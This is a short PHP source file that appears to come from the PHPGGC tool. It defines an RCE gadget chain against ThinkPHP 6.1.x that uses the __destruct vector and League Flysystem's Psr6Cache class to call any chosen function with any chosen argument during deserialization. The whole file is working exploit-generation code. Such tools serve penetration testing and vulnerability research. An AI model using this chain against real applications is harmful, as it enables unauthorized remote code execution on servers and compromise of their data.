<?php

namespace GadgetChain\ThinkPHP;

class RCE5 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '6.1.0 <= 6.1.x-dev';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return new \League\Flysystem\Cached\Storage\Psr6Cache($function, $parameter);
    }
}
